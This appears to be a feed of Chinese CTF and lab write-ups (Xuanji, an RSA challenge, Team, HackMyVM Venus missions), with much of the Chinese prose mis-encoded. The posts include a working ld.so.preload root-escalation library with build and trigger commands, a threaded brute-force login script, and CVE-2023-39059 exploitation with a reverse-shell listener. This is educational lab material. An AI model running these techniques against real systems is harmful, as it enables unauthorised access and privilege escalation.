`www-data` Áî®Êà∑ÂØπ `/etc/ld.so.preload` Êñá‰ª∂Êã•ÊúâÂÜôÂÖ•ÊùÉÈôê„ÄÇËØ•Êñá‰ª∂Áî®‰∫éÊåáÂÆöÂú®‰ªª‰ΩïÁ®ãÂ∫èËøêË°åÂâçÈúÄË¶ÅÈ¢ÑÂä†ËΩΩÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì„ÄÇËøôÊòØ‰∏Ä‰∏™ÁªèÂÖ∏ÁöÑ„ÄÅÈ´òÊàêÂäüÁéáÁöÑLinuxÊèêÊùÉÂêëÈáè„ÄÇ

## 2. Âà©Áî®`ld.so.preload`ÂÆûÁé∞ÊèêÊùÉ

1. **ÁºñÂÜôÊÅ∂ÊÑè‰ª£Á†Å**: Âú® `/tmp` ÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `exp.c` ÁöÑCËØ≠Ë®ÄÊñá‰ª∂ÔºåÂÖ∂ÂäüËÉΩÊòØÂú®Â∫ìË¢´Âä†ËΩΩÊó∂ÔºåÂ∞ÜÂΩìÂâçËøõÁ®ãÁöÑÊùÉÈôêÊèêÂçá‰∏∫rootÔºåÂπ∂ÂêØÂä®‰∏Ä‰∏™bash shell„ÄÇ

   ```c
   #include &lt;stdio.h&gt;
   #include &lt;sys/types.h&gt;
   #include &lt;unistd.h&gt;
   #include &lt;stdlib.h&gt;
   
   void __attribute__((constructor)) init() {
       unlink('/etc/ld.so.preload');
   
       setgid(0);
       setuid(0);
   
       execl('/bin/bash', 'bash', '--norc', '--noprofile', NULL);
   
   
       execl('/bin/sh', 'sh', NULL);
   }
   ```

2. **ÁºñËØëÂÖ±‰∫´Â∫ì**: ‰ΩøÁî® `gcc` Â∞ÜC‰ª£Á†ÅÁºñËØëÊàê‰∏Ä‰∏™ÂÖ±‰∫´Â∫ìÊñá‰ª∂ `exp.so`„ÄÇ

   ```bash
   www-data@Xuanji:/tmp$ gcc -fPIC -shared -o exp.so exp.c -nostartfiles
   ```

3. **Ëß¶ÂèëPayload**: Â∞ÜÊàë‰ª¨ÊÅ∂ÊÑèÂÖ±‰∫´Â∫ìÁöÑË∑ØÂæÑÂÜôÂÖ• `/etc/ld.so.preload` Êñá‰ª∂„ÄÇ

   ```bash
   www-data@Xuanji:/tmp$ echo '/tmp/exp.so' &gt; /etc/ld.so.preload
   ```

4. **ÊøÄÊ¥ªÊèêÊùÉ**: ÊâßË°å‰ªª‰Ωï‰∏Ä‰∏™‰ª•rootÊùÉÈôêËøêË°åÁöÑSUIDÁ®ãÂ∫èÔºàÂ¶Ç`sudo`ÔºâÊù•Ëß¶ÂèëÈ¢ÑÂä†ËΩΩ„ÄÇ

   ```bash
   www-data@Xuanji:/tmp$ sudo -l
   ```

   ËØ•ÂëΩ‰ª§‰ºöÁ´ãÂç≥Ë¢´Êàë‰ª¨È¢ÑÂä†ËΩΩÁöÑÂ∫ìÂä´ÊåÅÔºå‰ªéËÄå‰ª•rootÊùÉÈôêÊâßË°å `exp.so` ‰∏≠ÁöÑ‰ª£Á†Å„ÄÇ

## 3. Â§∫ÂèñÊóóÂ∏ú

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÁöÑshellÂêéÔºåÁõ¥Êé•ËØªÂèñÁî®Êà∑ÂíåÊ†πÁõÆÂΩï‰∏ãÁöÑÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
bash-5.0# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
bash-5.0# cat /root/root.txt /home/ahiz/user.txt 
flag{root-076ffb6ef92e5709fc8eda05872419e5}
flag{user-60b725f10c9c85c70d97880dfe8191b3}
```

Ê∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇ

# È¢òÂ§ñËØù

Google OTPÈÇ£ÈáåÔºå‰Ω†ÂèØ‰ª•ÂÅö‰∏ÄÂõûÁàÜÁ†¥‰ªô‰∫∫ÔºåÂ∑≤Áü•Google OTPÊòØ6‰ΩçÊï∞Â≠óÔºå30sÊõ¥Êñ∞‰∏ÄÊ¨°

ÊâÄ‰ª•Áõ¥Êé•ÁàÜÁ†¥ÔºåÊúâÊûÅÂ§ßÊ¶ÇÁéáÁàÜÁ†¥ÁöÑÂá∫Êù•

![image-20250807122825244](http://7r1UMPHK.github.io/image/20250807122825458.webp)

![image-20250807123315958](http://7r1UMPHK.github.io/image/20250807123316264.webp)

ËøôÊòØ‰πüÊòØ‰∏Ä‰∏™ÂäûÊ≥ïÔºåÂΩìÁÑ∂ËøôÊòØÈùûÂ∏∏ËßÑÊÄùË∑Ø

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Xuanji.html</guid><pubDate>Thu, 07 Aug 2025 07:52:13 +0000</pubDate></item><item><title>Challenge 090</title><link>https://7r1UMPHK.github.io/post/Challenge%20090.html</link><description>![image-20250806202931588](http://7r1UMPHK.github.io/image/20250806202940843.webp)

# È¢òÁõÆÂõûÈ°æ

ËØ•È¢òÁõÆÊèê‰æõ‰∫Ü‰∏ÄÁªÑ RSA Âä†ÂØÜÁöÑÂèÇÊï∞ÔºåÂåÖÊã¨ÂÖ¨Èí•ÊåáÊï∞ `e`„ÄÅ‰∏§‰∏™Â§ßÁ¥†Êï∞ `p` Âíå `q`Ôºå‰ª•ÂèäÂØÜÊñá `c`„ÄÇË¶ÅÊ±ÇÊàë‰ª¨Ëß£ÂØÜÂá∫ÂéüÂßãÊòéÊñá `m`„ÄÇ

# **Â∑≤Áü•ÂèÇÊï∞**

* **ÂÖ¨Èí•ÊåáÊï∞ (e):**

  ```
  e = 15
  ```

* **Á¥†Êï∞ (p):**

  ```
  p = 5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561
  ```

* **Á¥†Êï∞ (q):**

  ```
  q = 10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629
  ```

* **ÂØÜÊñá (c):**

  ```
  c = 32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298
  ```

ÂÄüÂä©‰∫ÜÁæ§ÂèãÁöÑÁ•ûÂäõ

![image-20250806222111843](http://7r1UMPHK.github.io/image/20250806222112003.webp)

```
import gmpy2
import libnum

e= 15
p=5787222305777209512262474249244794237065756326718637677563926399912102998238238932691915883680852764360339657453541520126740501334731391462921270092825561 
q=10111241397646344099231145262379017618139453896281400953386716762942327959742747939245765751686811392320346902374279922240577945339761221088737443752162629
c=32966311998568049751620491316882873597067466204334745472749990770205777075918461832930873069801888997659326011373601710520150688126730186357963781365253139365104376745890253761612763280897233928482429448491903090758335034298212464171556884740072764043302348824188102589373055730702026853687688157030795220298
n=p*q

gcd_q = gmpy2.gcd(e, q - 1)  # 1
d = gmpy2.invert(e, q - 1)
m = pow(c, d, q)
print(libnum.n2s(int(m)))
```

# Ëß£È¢òÊÄùË∑Ø

## 1. ÂèëÁé∞ÈóÆÈ¢ò

Ê†áÂáÜÁöÑ RSA Ëß£ÂØÜÊµÅÁ®ãÈúÄË¶ÅËÆ°ÁÆóÁßÅÈí• `d`ÔºåÂÖ∂‰∏≠ `d` ÊòØ `e` Ê®° `œÜ(n)` ÁöÑ‰πòÊ≥ïÈÄÜÂÖÉÔºåÂç≥ `d = e‚Åª¬π mod œÜ(n)`ÔºåËÄå `œÜ(n) = (p-1)(q-1)`„ÄÇËÆ°ÁÆóËØ•ÈÄÜÂÖÉÁöÑÂâçÊèêÊòØ `e` Âíå `œÜ(n)` ÂøÖÈ°ª‰∫íÁ¥†ÔºåÂç≥ `gcd(e, œÜ(n)) = 1`„ÄÇ

Êàë‰ª¨Êù•Ê£ÄÊü•Ëøô‰∏™Êù°‰ª∂Ôºö

*   `e = 15 = 3 * 5`
*   `p - 1` ÁöÑÊú´Â∞æÊòØ `0`ÔºåÂõ†Ê≠§ `p-1` ÊòØ `5` ÁöÑÂÄçÊï∞„ÄÇ
*   ËøôÊÑèÂë≥ÁùÄ `œÜ(n) = (p-1)(q-1)` ‰πüÊòØ `5` ÁöÑÂÄçÊï∞„ÄÇ
*   ÊâÄ‰ª• `gcd(e, œÜ(n))` Ëá≥Â∞ë‰∏∫ `5`Ôºå‰∏çÁ≠â‰∫é `1`„ÄÇ

**ÁªìËÆ∫Ôºö** Êó†Ê≥ïÈÄöËøáÊ†áÂáÜÊñπÂºèËÆ°ÁÆóÁßÅÈí• `d` Êù•Áõ¥Êé•ÂØπÊ®° `n` Ëß£ÂØÜ„ÄÇ

## 2. Êü≥ÊöóËä±Êòé

ËôΩÁÑ∂ `e` Âíå `œÜ(n)` ‰∏ç‰∫íÁ¥†Ôºå‰ΩÜËß£ÂØÜ‰ªçÊúâÂèØËÉΩ„ÄÇÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂà©Áî®‰∏≠ÂõΩÂâ©‰ΩôÂÆöÁêÜÁöÑÊÄùÊÉ≥ÔºåÂàÜÂà´Âú®Ê®° `p` ÂíåÊ®° `q` ÁöÑÊÑè‰πâ‰∏ãËøõË°åËß£ÂØÜ„ÄÇËøôÈúÄË¶Å `e` ‰∏é `p-1` Êàñ `q-1` ‰∫íÁ¥†„ÄÇ

Êàë‰ª¨Êù•Ê£ÄÊü• `e` ‰∏é `p-1` Âíå `q-1` ÁöÑÊúÄÂ§ßÂÖ¨Á∫¶Êï∞Ôºö

*   `gcd(e, p - 1)`: Âõ†‰∏∫ `p-1` ÊòØ `5` ÁöÑÂÄçÊï∞ÔºåÊâÄ‰ª• `gcd(15, p - 1) = 5`„ÄÇÊàë‰ª¨Êó†Ê≥ïÂú®Ê®° `p` ÁöÑÊÑè‰πâ‰∏ãÁõ¥Êé•Ê±ÇÈÄÜ„ÄÇ
*   `gcd(e, q - 1)`: ÁªèËøáËÆ°ÁÆóÔºå`gcd(15, q - 1) = 1`„ÄÇ

**ÁªìËÆ∫Ôºö** Êàë‰ª¨ÂèØ‰ª•ËÆ°ÁÆó `e` Âú®Ê®° `q-1` ‰∏ãÁöÑÈÄÜÂÖÉÔºå‰ªéËÄåÂú®Ê®° `q` ÁöÑÊÑè‰πâ‰∏ãÊÅ¢Â§çÊòéÊñá„ÄÇ

## 3. Ëß£ÂØÜÂéüÁêÜ

Êó¢ÁÑ∂ `gcd(e, q - 1) = 1`ÔºåÊàë‰ª¨ÂèØ‰ª•ËÆ°ÁÆóÂá∫ `d_q` Êª°Ë∂≥Ôºö
`d_q ‚â° e‚Åª¬π (mod q - 1)`

Ê†πÊçÆ RSA ÁöÑÂä†ÂØÜËøáÁ®ãÔºåÊàë‰ª¨ÊúâÔºö
`c ‚â° m^e (mod n)`

Ëøô‰πüÊÑèÂë≥ÁùÄÔºö
`c ‚â° m^e (mod q)`

‰∏§ËæπÂêåÊó∂Âèñ `d_q` Ê¨°ÊñπÔºö
`c^d_q ‚â° (m^e)^d_q ‚â° m^(e*d_q) (mod q)`

Áî±‰∫é `e*d_q ‚â° 1 (mod q - 1)`ÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂ÂÜôÊàê `e*d_q = k*(q-1) + 1` ÁöÑÂΩ¢ÂºèÔºàÂÖ∂‰∏≠ k ÊòØÊüê‰∏™Êï¥Êï∞Ôºâ„ÄÇ‰ª£ÂÖ•‰∏äÂºèÔºö
`c^d_q ‚â° m^(k*(q-1) + 1) ‚â° m * (m^(q-1))^k (mod q)`

Ê†πÊçÆË¥πÈ©¨Â∞èÂÆöÁêÜÔºå`m^(q-1) ‚â° 1 (mod q)`„ÄÇÂõ†Ê≠§Ôºö
`c^d_q ‚â° m * 1^k ‚â° m (mod q)`

ËøôÊ†∑ÔºåÊàë‰ª¨Â∞±ÂæóÂà∞‰∫Ü `m' = m mod q`„ÄÇÂú® CTF Á´ûËµõ‰∏≠ÔºåÂ¶ÇÊûúÊòéÊñáÊú¨Ë∫´‰∏çÊòØ‰∏Ä‰∏™ÈùûÂ∏∏Â§ßÁöÑÊï∞Â≠óÔºàÂç≥ `m &lt; q`ÔºâÔºåÈÇ£‰πàÊàë‰ª¨ËÆ°ÁÆóÂá∫ÁöÑ `m'` Â∞±Á≠â‰∫éÂéüÂßãÊòéÊñá `m`„ÄÇ

# Â∞èÊäÄÂ∑ßÊÄªÁªì

| Êù°‰ª∂                | ËÉΩÂê¶Ëß£ÂØÜ | Ëß£ÂØÜÊñπÂºè                                |
| :------------------ | :------- | :-------------------------------------- |
| `gcd(e, œÜ(n)) == 1` | ‚úÖ        | Ê†áÂáÜ RSA Ëß£ÂØÜÔºå`d = inverse(e, œÜ(n))`   |
| `gcd(e, p‚àí1) == 1`  | ‚úÖ        | ÂèØÂú® `mod p` ÊÑè‰πâ‰∏ãËß£ÂØÜÔºåÂæóÂà∞ `m mod p` |
| `gcd(e, q‚àí1) == 1`  | ‚úÖ        | ÂèØÂú® `mod q` ÊÑè‰πâ‰∏ãËß£ÂØÜÔºåÂæóÂà∞ `m mod q` |
| `gcd(e, p‚àí1) &gt; 1`   | ‚ùå        | Êó†Ê≥ïÁõ¥Êé•Ê±Ç `e` Ê®° `p-1` ÁöÑÈÄÜÂÖÉ          |
| `gcd(e, q‚àí1) &gt; 1`   | ‚ùå        | Êó†Ê≥ïÁõ¥Êé•Ê±Ç `e` Ê®° `q-1` ÁöÑÈÄÜÂÖÉ          |

# ÊúÄÁªàÁªìÊûú

ËøêË°å‰∏äËø∞‰ª£Á†ÅÂêéÔºåÊàë‰ª¨ÊàêÂäüÂæóÂà∞ÊòéÊñáÔºö

```
next_time_make_sure_to_choose_the_appropriate_e_788403071518
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20090.html</guid><pubDate>Wed, 06 Aug 2025 14:30:14 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Team</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Team.html</link><description>![image-20250806132045628](http://7r1UMPHK.github.io/image/20250806132045831.webp)

# **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫‰∏éÁ´ØÂè£ÂèëÁé∞

‰ΩøÁî® `arp-scan` Âíå `nmap` Âú®Êú¨Âú∞ÁΩëÁªúËøõË°åÊâ´ÊèèÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.129`ÔºåÂπ∂Á°ÆËÆ§ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH), 80 (HTTP) Âíå 3000 (HTTP) Á´ØÂè£„ÄÇ

**‰∏ªÊú∫ÂèëÁé∞:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.129 08:00:27:43:d1:3f       PCS Systemtechnik GmbH
...
```

**Á´ØÂè£Êâ´Êèè:**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.129
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
...
```

# 2. WebÊúçÂä°‰æ¶ÂØü

*   **80Á´ØÂè£**: ËøêË°å‰∏Ä‰∏™Âêç‰∏∫ 'Maze Security' ÁöÑÈùôÊÄÅÂÖ¨Âè∏ÁΩëÁ´ô„ÄÇÁõÆÂΩïÊâ´ÊèèÂèëÁé∞ `index.php`Ôºå‰ΩÜ‰∏é‰∏ªÈ°µÂÜÖÂÆπÁõ∏ÂêåÔºåÊú™ÂèëÁé∞ÊòéÊòæÊºèÊ¥û„ÄÇ
*   **3000Á´ØÂè£**: ËøêË°å‰∏Ä‰∏™WebÂ∫îÁî®ÔºåÈ°µÈù¢Ê†áÈ¢ò‰∏∫ 'Dashboard - Semaphore UI'„ÄÇËøôÊòØ‰∏Ä‰∏™ÂÖ≥ÈîÆÁ∫øÁ¥¢ÔºåË°®ÊòéÁõÆÊ†áÊ≠£Âú®‰ΩøÁî® Ansible Semaphore„ÄÇ

# **‰∫å„ÄÅÊºèÊ¥ûÂèëÁé∞‰∏éÂà©Áî®**

## 1. ÁâàÊú¨ËØÜÂà´‰∏éCVEÂèëÁé∞

ÂØπ3000Á´ØÂè£ÁöÑWebÂ∫îÁî®ËøõË°åÊ∑±ÂÖ•ÂàÜÊûêÔºåÂú®ÂÖ∂Âä†ËΩΩÁöÑJavaScriptÊñá‰ª∂ `chunk-vendors.54e1419.js` ‰∏≠ÔºåÂèëÁé∞‰∫ÜÊòéÁ°ÆÁöÑÁâàÊú¨‰ø°ÊÅØÔºö**Ansible Semaphore v2.7.2**„ÄÇ

ÈíàÂØπËØ•ÁâπÂÆöÁâàÊú¨ËøõË°åÊºèÊ¥ûÊêúÁ¥¢ÔºåËøÖÈÄüÂÆö‰ΩçÂà∞‰∏Ä‰∏™Â∑≤ÂÖ¨ÂºÄÁöÑ‰∏•ÈáçÊºèÊ¥ûÔºö**CVE-2023-39059**„ÄÇ

*   **ÊºèÊ¥ûÁ±ªÂûã**: ËøúÁ®ã‰ª£Á†ÅÊâßË°å (RCE)
*   **ÂΩ±ÂìçÁâàÊú¨**: v2.8.90 ÂèäÊõ¥Êó©ÁâàÊú¨
*   **ÊîªÂáªÂêëÈáè**: ÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÂêë‰ªªÂä°ÁöÑ 'Extra Variables' (È¢ùÂ§ñÂèòÈáè) ÂèÇÊï∞Ê≥®ÂÖ•ÊÅ∂ÊÑèÁöÑ `ansible-playbook` Ë¥üËΩΩÊù•ÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ
*   **Âà©Áî®ÂâçÊèê**: ÈúÄË¶Å‰∏Ä‰∏™‰ΩéÊùÉÈôêÁöÑÊôÆÈÄöÁî®Êà∑Ë¥¶Êà∑„ÄÇ

## 2. ÂàùÂßãËÆøÈóÆ (Êö¥ÂäõÁ†¥Ëß£)

Ê†πÊçÆÊºèÊ¥û‰ø°ÊÅØÔºåÈ¶ñË¶ÅÁõÆÊ†áÊòØËé∑Âèñ‰∏Ä‰∏™ÊúâÊïàÁöÑÁî®Êà∑Âá≠ÊçÆ„ÄÇ‰ΩøÁî®Ëá™ÂÆö‰πâÁöÑPythonËÑöÊú¨ÔºåÁªìÂêàÂ∏∏ËßÅÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÂ≠óÂÖ∏ÔºåÂØπ `/api/auth/login` Êé•Âè£ËøõË°åÊö¥ÂäõÁ†¥Ëß£ÊîªÂáª„ÄÇ

```python
import requests
import threading
import queue
import sys

t = queue.Queue()
r = requests.Session()
h = {
    'Host': '192.168.205.252:3000',
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json',
    'Origin': 'http://192.168.205.252:3000',
    'Connection': 'keep-alive',
    'Referer': 'http://192.168.205.252:3000/auth/login'
}

found = False
found_lock = threading.Lock()

def l(u, p):
    global found
    if found:
        return
    try:
        b = f'{{'auth':'{u}','password':'{p}'}}'.encode()
        x = r.post('http://192.168.205.252:3000/api/auth/login', data=b, headers=h, timeout=5)
        status = x.status_code
        if status != 401:
            with found_lock:
                if not found:
                    found = True
                    print(f'\n{u}:{p}')
                    print(f'{u}:{p} | {status} | {len(x.content)}')
                    # ÂÅúÊ≠¢ÊâÄÊúâÁ∫øÁ®ã
                    for _ in range(20):
                        t.put(None)
        else:
            print(f'{u}:{p} | 401')
    except Exception as e:
        print(f'{u}:{p} | ERR')

def w():
    while True:
        job = t.get()
        if job is None or found:
            t.task_done()
            break
        l(*job)
        t.task_done()

def m():
    th = []
    for _ in range(20):
        x = threading.Thread(target=w)
        x.start()
        th.append(x)

    with open('user', 'r') as uf:
        users = [line.strip() for line in uf if line.strip()]
    with open('rockyou.txt', 'r', encoding='latin1') as pf:
        for p in pf:
            p = p.strip()
            if not p or found:
                continue
            for u in users:
                if found:
                    break
                t.put((u, p))
            if found:
                break

    t.join()

    for x in th:
        x.join()

if __name__ == '__main__':
    m()
```

ÁªèËøáÂ∞ùËØïÔºåÊàêÂäüÁàÜÁ†¥Âá∫‰∏ÄÁªÑÂá≠ÊçÆÔºö

```
[+] ÊàêÂäü: root:password123
Áä∂ÊÄÅÁ†Å: 204, ÂìçÂ∫îÈïøÂ∫¶: 0
```

## 3. ËøúÁ®ã‰ª£Á†ÅÊâßË°å (RCE)

‰ΩøÁî® `root:password123` Âá≠ÊçÆÊàêÂäüÁôªÂΩïÂà∞ Ansible Semaphore UI„ÄÇ

### 3.1 ÈöúÁ¢çÂàÜÊûê

Âú®UI‰∏≠ÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `test` ÁöÑÈ¢ÑÁΩÆ‰ªªÂä°„ÄÇÁõ¥Êé•Â∞ùËØïËøêË°åËØ•‰ªªÂä°Â§±Ë¥•„ÄÇÊü•Áúã‰ªªÂä°Êó•ÂøóÂèëÁé∞Ôºå‰ªªÂä°Âú®ÊâßË°åPlaybook‰πãÂâçÂõ†Êó†Ê≥ïÂÖãÈöÜGit‰ªìÂ∫ìËÄåÂ§±Ë¥•ÔºåÈîôËØØ‰ø°ÊÅØ‰∏∫ `Failed updating repository: exit status 128`„ÄÇËøôÊÑèÂë≥ÁùÄ‰ªñÈÖçÁΩÆÁöÑ‰ªìÂ∫ìÊúâÈóÆÈ¢ò„ÄÇ

### 3.2 ÁªïËøáÈöúÁ¢çÂπ∂ÊâßË°åPayload

‰∏∫‰∫Ü‰Ωø‰ªªÂä°ËÉΩÂ§üÁªßÁª≠ÊâßË°åÂà∞Ëß¶ÂèëÊºèÊ¥ûÁöÑÈò∂ÊÆµÔºåÈúÄË¶ÅËß£ÂÜ≥Git‰ªìÂ∫ìÂÖãÈöÜÂ§±Ë¥•ÁöÑÈóÆÈ¢ò„ÄÇÈááÂèñ‰ª•‰∏ãÊ≠•È™§Ôºö

1. **ÂàõÂª∫ÊÅ∂ÊÑè‰ªìÂ∫ì**: Âú®GitHub‰∏äÂàõÂª∫‰∏Ä‰∏™ÂÖ¨ÂºÄÁöÑ‰ªìÂ∫ìÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™Âêç‰∏∫ `test` ÁöÑÊñá‰ª∂ÔºåÊñá‰ª∂ÂÜÖÂÆπ‰∏∫Êàë‰ª¨ÁöÑÂèçÂºπshellÂëΩ‰ª§„ÄÇ

   ![image-20250806131556828](http://7r1UMPHK.github.io/image/20250806131557125.webp)

2. **ÈÖçÁΩÆSemaphore‰ªìÂ∫ì**: Âú®Semaphore UIÁöÑ **‰ªìÂ∫ì (Repositories)** ËÆæÁΩÆ‰∏≠ÔºåÁºñËæë `test` ‰ªìÂ∫ìÔºåÂ∞ÜÂÖ∂URL‰øÆÊîπ‰∏∫Êàë‰ª¨ÂàõÂª∫ÁöÑÊÅ∂ÊÑèGitHub‰ªìÂ∫ìÂú∞ÂùÄ (`https://github.com/xxxx/test.git`)„ÄÇ

3. **ËÆæÁΩÆÁõëÂê¨Âô®**: Âú®ÊîªÂáªÊú∫ (Kali) ‰∏äÂºÄÂêØ `netcat` ÁõëÂê¨ÔºåÂáÜÂ§áÊé•Êî∂ÂèçÂºπshell„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
   ‚îî‚îÄ$ nc -lvnp 8888
   ```

4. **ÊâßË°å‰ªªÂä°**: ÂõûÂà∞‰ªªÂä°Ê®°ÊùøÈ°µÈù¢ÔºåÈáçÊñ∞ËøêË°å `test` ‰ªªÂä°„ÄÇËøôÊ¨°Ôºå‰ªìÂ∫ìÂÖãÈöÜÊàêÂäüÔºå‰ªªÂä°ÁªßÁª≠ÊâßË°åÔºå‰ªéËÄåËß¶Âèë‰∫ÜÊàë‰ª¨È¢ÑËÆæÂú® `test` Êñá‰ª∂‰∏≠ÁöÑÂèçÂºπshellÂëΩ‰ª§„ÄÇ

ÊàêÂäüÂú®Êú¨Âú∞ `netcat` ÁõëÂê¨Âô®‰∏äÊé•Êî∂Âà∞Êù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑ `root` ÊùÉÈôêÂèçÂºπshell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 53826
bash: cannot set terminal process group (348): Inappropriate ioctl for device
bash: no job control in this shell
root@Team:~/repository_1_template_1# id
uid=0(root) gid=0(root) groups=0(root)
```

# **‰∏â„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

Ëé∑Âèñ `root` shellÂêéÔºåÁõ¥Êé•ËØªÂèñÁî®Êà∑ÂíåÊ†πÁõÆÂΩï‰∏ãÁöÑÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
root@Team:~/repository_1_template_1# cat /root/root.txt /home/ll104567/user.txt
flag{root-cf768ad5a2fbffcf22d79bdb3feac305}
flag{user-f1d1d471045542b64f3fff665b42035a}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Team.html</guid><pubDate>Wed, 06 Aug 2025 12:20:01 +0000</pubDate></item><item><title>hmv_Labs_venus22to30</title><link>https://7r1UMPHK.github.io/post/hmv_Labs_venus22to30.html</link><description># ÁªßÁª≠
## **Mission 0x22: eloise -&gt; lucia**

-   **‰ªªÂä°**: Áî®Êà∑ `lucia` Áî®‰∏ÄÁßçÊúâÂàõÊÑèÁöÑÊñπÂºè‰øùÂ≠ò‰∫ÜÂ•πÁöÑÂØÜÁ†Å„ÄÇ

1.  Âú®ÂÆ∂ÁõÆÂΩï‰∏≠ÂèëÁé∞‰∏Ä‰∏™ `hi` Êñá‰ª∂ÔºåÂÖ∂ÂÜÖÂÆπ‰∏∫ÂçÅÂÖ≠ËøõÂà∂Ê†ºÂºè„ÄÇ

    ```bash
    eloise@venus:~$ cat hi
    00000000: 7576 4d77 4644 5172 5157 504d 6547 500a
    ```

2.  ËøôÊòØ‰∏Ä‰∏™ÂçÅÂÖ≠ËøõÂà∂ËΩ¨ÂÇ® (hexdump)ÔºåÈúÄË¶ÅÂ∞ÜÂÖ∂ËΩ¨Êç¢ÂõûÂéüÂßãÊñáÊú¨„ÄÇ‰ΩøÁî® `xxd` Â∑•ÂÖ∑ËøõË°åÈÄÜÂêëËΩ¨Êç¢„ÄÇ

    ```bash
    eloise@venus:~$ cat hi | xxd -r -p
    uvMwFDQrQWPMeGP
    ```

3.  ‰ΩøÁî®ÂæóÂà∞ÁöÑÂØÜÁ†ÅÂàáÊç¢Âà∞ `lucia` Áî®Êà∑„ÄÇ

    ```bash
    eloise@venus:~$ su lucia
    Password: uvMwFDQrQWPMeGP
    ```

---

## **Mission 0x23: lucia -&gt; isabel**

-   **‰ªªÂä°**: Áî®Êà∑ `isabel` ÁöÑÂØÜÁ†ÅÂú® `/etc/xdg` ÁõÆÂΩï‰∏ãÁöÑ‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÊñá‰ª∂Âêç‰∏çËØ¶Ôºå‰ΩÜ `dict.txt` Êñá‰ª∂ÂèØ‰ª•Êèê‰æõÁ∫øÁ¥¢„ÄÇ

1.  Ê£ÄÊü•ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `dict.txt`ÔºåÂÆÉÂåÖÂê´‰∏Ä‰∏™Êñá‰ª∂ÂêçÂàóË°®„ÄÇÂêåÊó∂ÔºåÂú®ËØ•Êñá‰ª∂‰∏≠ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÈöêËóèÁöÑ Flag„ÄÇ

2.  ÁºñÂÜô‰∏Ä‰∏™Âæ™ÁéØËÑöÊú¨ÔºåËØªÂèñ `dict.txt` ‰∏≠ÁöÑÊØè‰∏ÄË°åÔºåÂπ∂Â∞ùËØïËÆøÈóÆ `/etc/xdg/` ÁõÆÂΩï‰∏ãÂØπÂ∫îÁöÑÊñá‰ª∂ÔºåÁõ¥Âà∞ÊâæÂà∞ÂØÜÁ†Å‰∏∫Ê≠¢„ÄÇ

    ```bash
    lucia@venus:~$ while read f; do file='/etc/xdg/$f'; cat '$file' 2&gt;/dev/null &amp;&amp; echo 'Found in: $file' &amp;&amp; break; done &lt; ~/dict.txt
    H5ol8Z2mrRsorC0
    Found in: /etc/xdg/readme
    ```

3.  ËÑöÊú¨ÊàêÂäüÂú® `/etc/xdg/readme` Êñá‰ª∂‰∏≠ÊâæÂà∞‰∫ÜÂØÜÁ†Å„ÄÇ‰ΩøÁî®ËØ•ÂØÜÁ†ÅÂàáÊç¢Âà∞ `isabel` Áî®Êà∑„ÄÇ

    ```bash
    lucia@venus:~$ su isabel
    Password: H5ol8Z2mrRsorC0
    ```

---

## **Mission 0x24: isabel -&gt; freya**

-   **‰ªªÂä°**: Áî®Êà∑ `freya` ÁöÑÂØÜÁ†ÅÊòØ `different.txt` Êñá‰ª∂‰∏≠ÂîØ‰∏ÄÊ≤°ÊúâÈáçÂ§çÁöÑÂ≠óÁ¨¶‰∏≤„ÄÇ

